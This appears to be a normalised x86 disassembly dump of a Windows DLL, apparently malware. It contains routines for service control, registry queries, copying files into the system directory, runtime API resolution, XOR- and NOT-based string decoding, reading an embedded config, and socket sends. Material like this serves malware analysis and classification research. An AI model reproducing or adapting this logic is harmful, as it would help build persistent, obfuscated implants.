and edx 0x1
add eax eax
or eax edx
dec ecx
jne r-xdata
mov ecx [ ebp + 0x74 ]
xor ecx ebp
mov [ rw-data ] eax
call sub_71006270
add ebp 0x78
leave
retn
sub_71001fd8
push ebp
lea ebp [ esp - 0x1f90 ]
mov eax 0x2010
call sub_71006310
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x1f8c ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x1f98 ]
push 0xc8
xor ebx ebx
push ebx
mov esi rw-data
push esi
call memset
mov edx esi
add esp 0xc
mov [ ebp - 0x78 ] ebx
mov eax edi
sub edx edi
cmp ebx [ ebp + 0x1f9c ]
jne r-xdata
inc ebx
mov [ edx + eax ] cl
inc eax
cmp ebx 0x32
mov [ ebp - 0x78 ] ebx
jb r-xdata
mov ebx 0x2000
push ebx
lea eax [ ebp - 0x74 ]
push 0x0
push eax
call memset
mov eax [ ebp - 0x78 ]
add esp 0xc
inc eax
cmp eax [ ebp + 0x1f9c ]
mov [ ebp - 0x80 ] eax
jae r-xdata
xor eax eax
jmp r-xdata
mov cl [ eax ]
not cl
cmp cl 0x23
mov [ eax ] cl
je r-xdata
push ebx
push 0x0
push edi
call memset
mov eax [ ebp + 0x1f9c ]
sub eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x74 ]
push eax
push edi
call memcpy
push esi
call [ atoi@IAT ]
add esp 0x1c
push 0x64
pop ecx
mov edx eax
sub edx [ ebp - 0x78 ]
lea ecx [ edi + eax ]
lea edx [ ebp + edx - 0x75 ]
mov [ ebp - 0x7c ] edx
mov edx [ ebp + 0x1f9c ]
sub edx eax
push edx
push ecx
push [ ebp - 0x7c ]
call memcpy
add esp 0xc
mov ecx [ ebp + 0x1f8c ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_71006270
add ebp 0x1f90
leave
retn
mov edx eax
shr edx 0x6
xor edx eax
shr edx 0x18
and edx 0x1
add eax eax
or eax edx
dec ecx
jne r-xdata
push 0x64
mov [ rw-data ] eax
pop ecx
mov edx eax
shr edx 0xd
xor edx eax
shr edx 0x11
and edx 0x1
add eax eax
or eax edx
dec ecx
jne r-xdata
mov [ rw-data ] eax
mov eax [ ebp + 0x1f9c ]
sub eax [ ebp - 0x80 ]
sub_7100210d
push ebx
push edi
xor eax eax
xor ebx ebx
cmp [ esp + 0xc ] ebx
mov edi rw-data
stosd [ edi ]
jle r-xdata
pop edi
mov al 0x1
pop ebx
retn
mov edx [ rw-data ]
push esi
mov esi [ rw-data ]
xor ecx ecx
mov eax esi
mov edi eax
shr edi cl
add ecx 0x8
and edi 0xff
xor eax edi
cmp ecx 0x20
jl r-xdata
mov [ ebx + rw-data ] al
inc ebx
cmp ebx [ esp + 0x10 ]
mov [ rw-data ] eax
jl r-xdata
lea eax [ esi + edx ]
mov ecx ebx
shl ecx 0x10
xor eax ecx
add eax ebx
mov ecx eax
shl eax 0x10
shr ecx 0x10
add ecx eax
xor edx ecx
xor esi ecx
test bl 0x1
mov eax edx
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] edx
pop esi
sub_7100219f
push ebp
sub esp 0x1f4
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x1f4 ] eax
push 0x2c
mov eax sub_71006d66
call sub_710063f8
mov eax [ ebp + 0x200 ]
mov ecx [ ebp + 0x208 ]
mov esi [ ebp + 0x204 ]
xor ebx ebx
cmp eax ebx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x14 ] 0x80000002
mov [ ebp - 0x4 ] ebx
je r-xdata
xor eax eax
cmp [ eax ] bl
je r-xdata
push eax
push r--data
lea eax [ ebp ]
push 0x1f4
push eax
call [ _snprintf@IAT ]
add esp 0x10
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push ebx
lea eax [ ebp ]
push eax
push [ ebp - 0x14 ]
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push esi
mov esi [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0x24 ]
push eax
push ebx
push r--data
push [ ebp - 0x14 ]
mov [ ebp - 0x18 ] 0x104
call esi
mov edi [ SetLastError@IAT ]
push eax
mov [ ebp - 0x30 ] eax
call edi
cmp [ ebp - 0x30 ] ebx
je r-xdata
mov [ ebp - 0x34 ] r--data
push r--data
lea eax [ ebp - 0x34 ]
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x2c ]
lea eax [ ebp - 0x24 ]
push eax
push ebx
push r--data
push [ ebp - 0x14 ]
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x18 ] 0x4
call esi
mov esi eax
push esi
call edi
cmp esi ebx
je r-xdata
mov [ ebp - 0x20 ] r--data
push r--data
lea eax [ ebp - 0x20 ]
jmp r-xdata
mov [ ebp - 0x1c ] 0x2
push [ ebp - 0x14 ]
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x1c ]
jmp r-xdata
mov [ ebp - 0x28 ] r--data
push r--data
lea eax [ ebp - 0x28 ]
jmp r-xdata
push eax
call _CxxThrowException
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x1f4 ]
xor ecx ebp
call sub_71006270
add ebp 0x1f8
leave
retn
sub_71002315
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
and [ ebp - 0xc ] 0x0
mov [ rw-data ] eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ rw-data ]
mov [ ebp - 0x1c ] 0x10
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x4 ] 0xbb8
call [ SetServiceStatus@IAT ]
leave
retn
sub_7100235d
mov eax [ esp + 0x4 ]
dec eax
push esi
je r-xdata
push 0x1
xor esi esi
push esi
push 0x3
call sub_71002315
add esp 0xc
push 0xa
call [ Sleep@IAT ]
dec eax
je r-xdata
push 0x1
xor esi esi
push esi
push 0x6
call sub_71002315
push esi
push esi
push 0x7
dec eax
je r-xdata
pop esi
retn 0x4
push 0x1
xor esi esi
push esi
push 0x5
call sub_71002315
push esi
push esi
push 0x4
jmp r-xdata
dec eax
je r-xdata
call sub_71002315
add esp 0x18
jmp r-xdata
xor esi esi
push esi
push esi
push [ rw-data ]
jmp r-xdata
dec eax
jne r-xdata
call sub_71002315
add esp 0xc
xor esi esi
jmp r-xdata
push esi
push esi
push 0x1
sub_710023d4
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x98 ]
push eax
mov [ ebp - 0x98 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x88 ] 0x0
je r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
cmp [ ebp - 0x88 ] 0x2
sete al
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_71006270
leave
retn
sub_71002470
push ebp
lea ebp [ esp - 0x3bc ]
sub esp 0x43c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x3b8 ] eax
push esi
mov esi 0x104
push esi
lea eax [ ebp + 0xac ]
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x7c ]
push eax
push r--data
call [ _findfirst64i32@IAT ]
cmp eax 0xffffffff
pop ecx
pop ecx
mov [ ebp - 0x80 ] eax
je r-xdata
mov ecx [ ebp + 0x3b8 ]
xor ecx ebp
pop esi
call sub_71006270
add ebp 0x3bc
leave
retn
push ebx
push edi
lea eax [ ebp - 0x58 ]
push eax
call [ GetFileAttributesA@IAT ]
test al 0x10
mov ebx [ strstr@IAT ]
jne r-xdata
cmp [ ebp - 0x58 ] 0x2e
je r-xdata
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ ebp - 0x80 ]
call [ _findnext64i32@IAT ]
test eax eax
pop ecx
pop ecx
je r-xdata
mov edi [ _chdir@IAT ]
lea eax [ ebp - 0x58 ]
push eax
call edi
call sub_71002470
mov [ esp ] r--data
call edi
pop ecx
jmp r-xdata
push esi
lea eax [ ebp + 0x2b4 ]
push 0x0
push eax
call memset
lea eax [ ebp + 0x2b4 ]
push esi
push eax
call [ _getcwd@IAT ]
lea edi [ ebp + 0x2b4 ]
add esp 0x14
dec edi
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
call [ GetFileAttributesA@IAT ]
test al 0x10
je r-xdata
push [ ebp - 0x80 ]
call [ _findclose@IAT ]
pop ecx
pop edi
pop ebx
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
lea eax [ ebp - 0x58 ]
movsw [ edi ] [ esi ]
mov edx eax
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
jne r-xdata
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp + 0x2b4 ]
sub eax edx
dec edi
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
jne r-xdata
push esi
lea eax [ ebp + 0x2b4 ]
push 0x0
push eax
call memset
lea eax [ ebp + 0x2b4 ]
push esi
push eax
call [ _getcwd@IAT ]
lea edi [ ebp + 0x2b4 ]
add esp 0x14
dec edi
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
jne r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
push 0x104
lea eax [ ebp + 0x1b0 ]
and ecx 0x3
push 0x0
push eax
[ edi ] [ esi ]
call memset
add esp 0xc
xor eax eax
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
lea eax [ ebp - 0x58 ]
movsw [ edi ] [ esi ]
mov edx eax
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
jne r-xdata
mov cl [ ebp + eax + 0xac ]
mov [ ebp + eax + 0x1b0 ] cl
inc eax
test cl cl
jne r-xdata
lea edi [ ebp + 0x1b0 ]
dec edi
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp + 0x2b4 ]
sub eax edx
dec edi
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x58 ]
movsw [ edi ] [ esi ]
mov edx eax
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
jne r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
push 0x104
lea eax [ ebp + 0x1b0 ]
and ecx 0x3
push 0x0
push eax
[ edi ] [ esi ]
call memset
add esp 0xc
xor eax eax
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp + 0x1b0 ]
sub eax edx
dec edi
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
jne r-xdata
mov cl [ ebp + eax + 0xac ]
mov [ ebp + eax + 0x1b0 ] cl
inc eax
test cl cl
jne r-xdata
lea edi [ ebp + 0x1b0 ]
dec edi
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
jne r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x58 ]
movsw [ edi ] [ esi ]
mov edx eax
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
push 0x1
lea eax [ ebp + 0x1b0 ]
push eax
lea eax [ ebp + 0x2b4 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ CopyFileA@IAT ]
push 0x32
call [ Sleep@IAT ]
mov esi 0x104
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp + 0x1b0 ]
sub eax edx
dec edi
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
jne r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
jne r-xdata
lea eax [ ebp - 0x58 ]
push r--data
push eax
call ebx
test eax eax
pop ecx
pop ecx
je r-xdata
sub_71002873
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
sub eax edx
push eax
push [ ebp + 0x8 ]
push [ rw-data ]
call [ WriteFile@IAT ]
test eax eax
setne al
leave
retn
sub_710028a3
push ebp
lea ebp [ esp - 0x28c ]
sub esp 0x30c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x288 ] eax
push esi
push edi
push 0x104
lea eax [ ebp - 0x7c ]
push eax
call [ GetSystemDirectoryA@IAT ]
lea edi [ ebp - 0x7c ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi 0x200
push esi
lea eax [ ebp + 0x88 ]
push 0x0
push eax
call memset
lea eax [ ebp - 0x7c ]
push r--data
push eax
call [ fopen@IAT ]
mov edi eax
add esp 0x14
test edi edi
mov [ ebp - 0x80 ] edi
jne r-xdata
push ebx
push 0x2
push 0xfffffe00
push edi
call [ fseek@IAT ]
push edi
push esi
lea eax [ ebp + 0x88 ]
push 0x1
push eax
call [ fread@IAT ]
add esp 0x1c
push 0x2
pop ecx
mov edi r--data
lea esi [ ebp + 0x88 ]
xor eax eax
[ esi ] [ edi ]
jne r-xdata
xor al al
jmp r-xdata
push [ ebp - 0x80 ]
call [ fclose@IAT ]
pop ecx
mov al 0x1
mov ebx [ strchr@IAT ]
lea eax [ ebp + 0x88 ]
push 0x2d
push eax
call ebx
test eax eax
pop ecx
pop ecx
je r-xdata
mov ecx [ ebp + 0x288 ]
pop edi
xor ecx ebp
pop esi
call sub_71006270
add ebp 0x28c
leave
retn
xor al al
jmp r-xdata
lea ecx [ ebp + 0x88 ]
sub eax ecx
mov edi eax
lea eax [ edi - 0x8 ]
xor ecx ecx
test eax eax
jle r-xdata
pop ebx
mov esi [ strncpy@IAT ]
lea eax [ edi - 0x8 ]
push eax
lea eax [ ebp + 0x90 ]
push eax
push rw-data
call esi
lea eax [ ebp + 0x88 ]
add esp 0xc
lea ecx [ eax + 0x1 ]
not [ ebp + ecx + 0x90 ]
inc ecx
cmp ecx eax
jl r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
sub eax edi
push eax
lea eax [ ebp + edi + 0x89 ]
push eax
lea eax [ ebp + 0x88 ]
push eax
call esi
lea eax [ ebp + 0x88 ]
push 0x2d
push eax
call ebx
add esp 0x14
test eax eax
je r-xdata
lea ecx [ ebp + 0x88 ]
sub eax ecx
mov edi eax
xor eax eax
test edi edi
jle r-xdata
push edi
lea eax [ ebp + 0x88 ]
push eax
push rw-data
call esi
lea eax [ ebp + 0x88 ]
add esp 0xc
lea ecx [ eax + 0x1 ]
not [ ebp + eax + 0x88 ]
inc eax
cmp eax edi
jl r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
sub eax edi
push eax
lea eax [ ebp + edi + 0x89 ]
push eax
lea eax [ ebp + 0x88 ]
push eax
call esi
lea eax [ ebp + 0x88 ]
push 0x2d
push eax
call ebx
add esp 0x14
test eax eax
je r-xdata
lea ecx [ ebp + 0x88 ]
sub eax ecx
xor ecx ecx
test eax eax
jle r-xdata
push eax
lea eax [ ebp + 0x88 ]
push eax
push rw-data
call esi
add esp 0xc
not [ ebp + ecx + 0x88 ]
inc ecx
cmp ecx eax
jl r-xdata
sub_71002a9f
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push r--data
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
mov [ ebp - 0x18 ] edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
pop edi
pop ebx
leave
retn
pop esi
push [ ebp - 0x8 ]
call ??_V@YAXPAX@Z
add [ ebp - 0x4 ] 0x7d0
push [ ebp - 0x4 ]
call ??_U@YAPAXI@Z
mov esi eax
cmp esi ebx
pop ecx
pop ecx
mov [ ebp - 0x8 ] esi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x4 ]
push esi
push 0x5
call [ rw-data ]
cmp eax 0xc0000004
je r-xdata
cmp eax ebx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] esi
lea esi [ eax + 0x1 ]
push esi
call ??_V@YAXPAX@Z
pop ecx
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
push ebx
sub eax esi
mov esi [ MultiByteToWideChar@IAT ]
push ebx
inc eax
push eax
push [ ebp + 0x8 ]
push ebx
push ebx
call esi
mov edi eax
lea eax [ edi + edi ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
push edi
push [ ebp - 0x4 ]
sub eax ecx
inc eax
push eax
push [ ebp + 0x8 ]
push ebx
push ebx
call esi
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
add eax eax
mov [ ebp - 0x20 ] ax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x1e ] ax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ esi ]
cmp eax ebx
sete cl
add esi eax
cmp cl bl
mov [ ebp - 0xc ] esi
je r-xdata
push 0x1
lea eax [ esi + 0x38 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
mov esi [ ebp - 0xc ]
cmp [ esi + 0x3c ] ebx
je r-xdata
mov esi ebx
jmp r-xdata
mov esi [ esi + 0x44 ]
push [ ebp - 0x8 ]
call ??_V@YAXPAX@Z
pop ecx
push [ ebp - 0x18 ]
call [ FreeLibrary@IAT ]
mov eax esi
sub_71002c16
push ebp
mov ebp esp
sub esp 0x694
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ lstrcpyA@IAT ]
push edi
mov edi [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x344 ]
push eax
call esi
push edi
lea eax [ ebp - 0x240 ]
push eax
call esi
xor ebx ebx
push ebx
call [ CoInitialize@IAT ]
lea eax [ ebp - 0x690 ]
push eax
push r--data
push 0x1
push ebx
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jl r-xdata
push ebx
lea eax [ ebp - 0x240 ]
push eax
call [ CreateDirectoryA@IAT ]
push 0x32
lea eax [ ebp - 0x38 ]
push ebx
push eax
call memset
lea eax [ ebp - 0x13c ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov eax [ ebp - 0x690 ]
mov ecx [ eax ]
lea edx [ ebp - 0x694 ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov esi eax
js r-xdata
mov eax [ ebp - 0x690 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov esi 0x104
push esi
lea eax [ ebp - 0x54c ]
push eax
push 0xffffffff
lea eax [ ebp - 0x344 ]
push eax
push 0x1
push ebx
call [ MultiByteToWideChar@IAT ]
mov eax [ ebp - 0x694 ]
mov ecx [ eax ]
push ebx
lea edx [ ebp - 0x54c ]
push edx
push eax
call [ ecx + 0x14 ]
test eax eax
jl r-xdata
lea eax [ ebp - 0x13c ]
lea ecx [ esi + 0x1 ]
lea edi [ eax + 0x1 ]
cmp [ ebp + esi - 0x13c ] 0x5c
je r-xdata
mov eax [ ebp - 0x694 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
xor eax eax
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax edi
cmp ecx eax
jae r-xdata
dec esi
jns r-xdata
mov cl [ ebp + eax - 0x344 ]
mov [ ebp + eax - 0x13c ] cl
inc eax
cmp cl bl
jne r-xdata
mov eax [ ebp - 0x690 ]
mov ecx [ eax ]
push 0x2
lea edx [ ebp - 0x68c ]
push edx
push esi
lea edx [ ebp - 0x13c ]
push edx
push eax
call [ ecx + 0xc ]
lea eax [ ebp - 0x38 ]
mov edx eax
mov eax ecx
sub eax esi
lea esi [ ebp + eax - 0x39 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ ebp - 0x240 ]
sub eax edx
dec edi
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax edi
cmp ecx eax
jb r-xdata
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
push 0x1
lea eax [ ebp - 0x240 ]
push eax
lea eax [ ebp - 0x13c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ CopyFileA@IAT ]
mov ecx [ ebp - 0x4 ]
neg eax
pop edi
sbb eax eax
pop esi
xor ecx ebp
neg eax
pop ebx
call sub_71006270
leave
retn
mov al [ ebp + ecx - 0x13c ]
mov [ esi ] al
lea eax [ ebp - 0x13c ]
inc ecx
inc esi
lea edi [ eax + 0x1 ]
sub_71002ded
push ebx
push ebp
push esi
push edi
push 0x64
call [ malloc@IAT ]
push 0x64
xor ebp ebp
mov esi eax
push ebp
push esi
call memset
mov ecx [ esp + 0x24 ]
mov eax ecx
add esp 0x10
lea edi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
add ecx 0x4
push ecx
push esi
call [ strncpy@IAT ]
mov ecx [ esi ]
mov edi r--data
mov eax edi
add esp 0xc
cmp ecx [ eax ]
mov ebx r--data
je r-xdata
mov eax [ esi ]
cmp eax [ edi ]
jne r-xdata
mov eax ebx
cmp ecx [ eax ]
je r-xdata
cmp eax [ ebx ]
jne r-xdata
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
push r--data
push r--data
call [ fopen@IAT ]
push esi
mov ebp eax
push r--data
push ebp
call [ fprintf@IAT ]
push ebp
call [ fclose@IAT ]
add esp 0x18
xor ebp ebp
mov edi [ GetProcAddress@IAT ]
mov [ rw-data ] ebp
push r--data
call [ LoadLibraryA@IAT ]
cmp eax ebp
mov [ rw-data ] eax
je r-xdata
push esi
call [ free@IAT ]
pop ecx
push ebp
call [ ExitThread@IAT ]
push r--data
push eax
call [ GetProcAddress@IAT ]
call eax
push [ rw-data ]
call [ FreeLibrary@IAT ]
jmp r-xdata
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
cmp [ rw-data ] ebp
jne r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
call eax
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
push r--data
push eax
call edi
cmp eax ebp
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
cmp eax ebp
mov [ rw-data ] eax
je r-xdata
push esi
call sub_71002a9f
test eax eax
pop ecx
je r-xdata
push [ rw-data ]
call [ FreeLibrary@IAT ]
mov [ rw-data ] ebp
call eax
push r--data
push eax
call edi
cmp eax ebp
je r-xdata
call eax
jmp r-xdata
sub_71002f4a
push ebp
mov ebp esp
sub esp 0x10c
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
xor edi edi
cmp esi edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] 0x7a120
jle r-xdata
mov eax [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp esi edi
jg r-xdata
push edi
push esi
push [ ebp + 0xc ]
push ebx
call send
cmp eax edi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push edi
lea eax [ ebp - 0x10c ]
push eax
push edi
push edi
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x10c ] 0x1
call select
lea eax [ ebp - 0x10c ]
push eax
push ebx
call __WSAFDIsSet
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
sub eax esi
jmp r-xdata
add [ ebp + 0xc ] eax
sub esi eax
pop edi
pop esi
pop ebx
leave
retn
sub_71002fc7
push ebp
mov ebp esp
sub esp 0x430
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x42c ]
push 0x400
push eax
call [ _vsnprintf@IAT ]
add esp 0x10
push 0xfffffff5
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
push r--data
push r--data
call [ fopen@IAT ]
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x42c ]
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x42c ]
push eax
call [ OutputDebugStringA@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_71006270
leave
retn
lea eax [ ebp - 0x42c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ _strtime@IAT ]
pop ecx
push eax
lea eax [ ebp - 0x2c ]
push eax
call [ _strdate@IAT ]
pop ecx
push eax
push r--data
push esi
call [ fprintf@IAT ]
add esp 0x14
call [ __iob_func@IAT ]
add eax 0x40
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov esi [ WriteFile@IAT ]
push 0x0
lea ecx [ ebp - 0x430 ]
push ecx
sub eax edx
push eax
lea eax [ ebp - 0x42c ]
push eax
push edi
call esi
push 0x0
lea eax [ ebp - 0x430 ]
push eax
push 0x2
push r--data
push edi
call esi
jmp r-xdata
push esi
call [ fclose@IAT ]
pop ecx
sub_710030bc
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x10 ]
push [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
leave
retn
call [ GetLastError@IAT ]
test eax eax
je r-xdata
or [ ebp - 0x8 ] 0xffffffff
or [ ebp - 0x4 ] 0xffffffff
sub_71003100
push esi
push edi
push [ esp + 0x10 ]
mov edi [ esp + 0x10 ]
push edi
call sub_71001fd8
mov esi eax
push esi
call sub_7100210d
add esp 0xc
xor edx edx
test esi esi
jbe r-xdata
lea eax [ edx + edi - 0x1 ]
cmp [ eax ] 0x23
pop edi
pop esi
jne r-xdata
mov ecx rw-data
mov eax edi
sub ecx edi
mov edx esi
push ebx
retn
mov [ eax ] 0x0
mov bl [ ecx + eax ]
xor [ eax ] bl
inc eax
dec esi
jne r-xdata
pop ebx
sub_71003146
push esi
mov esi [ esp + 0xc ]
push esi
call sub_7100210d
test esi esi
pop ecx
jbe r-xdata
pop esi
retn
mov eax [ esp + 0x8 ]
mov ecx rw-data
sub ecx eax
mov dl [ ecx + eax ]
